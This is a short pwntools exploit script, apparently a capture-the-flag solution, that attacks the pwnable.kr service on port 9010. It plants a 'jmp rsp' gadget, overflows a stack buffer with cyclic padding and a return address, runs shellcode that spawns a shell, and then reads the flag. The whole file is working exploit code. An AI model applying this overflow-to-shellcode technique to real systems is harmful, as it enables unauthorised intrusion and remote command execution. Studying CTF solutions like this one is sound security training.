from pwn import *

context(arch="amd64")
off_s = -0x20
off_ret = 8
addr_id = 0x00000000006020A0
jmp_rsp = asm("jmp rsp")
payload = cyclic(off_ret-off_s) + p64(addr_id) + asm(shellcraft.sh())
r = remote("pwnable.kr", 9010)
r.recvuntil(" : ")
r.sendline(jmp_rsp)
r.recvuntil("> ")
r.sendline("1")
r.recvline_startswith("hello")
r.sendline(payload)
r.recvline_startswith("goodbye")
r.sendline("cat flag")
r.sendline("exit")
print r.recvall()
